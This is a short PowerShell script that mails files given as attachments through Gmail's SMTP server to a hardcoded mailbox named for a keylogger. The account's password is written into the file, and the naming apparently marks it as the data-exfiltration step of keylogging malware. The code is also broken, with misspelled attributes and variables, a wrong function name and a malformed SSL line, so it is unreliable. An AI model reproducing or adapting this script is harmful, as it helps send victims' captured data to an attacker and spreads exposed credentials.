﻿Param( [String]$Att,
       [String]$Subj,
       [String]$Body
       
       )

Function Send_Email
{
    Param(
            [Parameter(
            Mandatory=$true)]
        [String]$To,
           [Parameter(
           Mandory=$true)]
        [String]$From,
            [Parameter(
            Mandatory=$true)]
        [String]$Password,
           [Parameter(
           Mandory=$true)]
         [String]$Subject,
           [Parameter(
           Mandory=$true)]
         [String]$Body,
           [Parameter(
           Mandory=$true)]
         [String]$attachment
           )

try
{
    $Msg = New-Object System.Net.Mail.MailMessage($From , $To, $Subject , $Body)
    $Srv = "smtp.gmail.com"
    if($attachment -ne $null)
    {
        try
        {
            $attachment = $attachment -split ("\:\:");

            ForEach($val in $Attechments)
            {
            $attch =  New-Object System.Net.Mail.Attachment($val)
            $Msg.Attachments.Add($attch)
            } 
        }
        catch 
        {
            exit 2;
        }
        $Client = New-Object System.Net.Mail.SmtpClient($Srv, 587)
        $Client = Enablessl = $true
        $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password)
        $Client.Send($Msg)
        Remove-Variable -Name Client
        Remove-Variable -Name Password
        exit 7; 
    }
   

}
  catch 
    {
        exit 3;
    }
}

try
{
    Send-Email
        -attechment $Att
        -To "testingforkeylogger@gmail.com"
        -Body $Body
        -Subject $Subj
        -Password "testingforkeylogger123."
        -From "testingforkeylogger@gmail.com"


}
catch 
{

exit 4;
}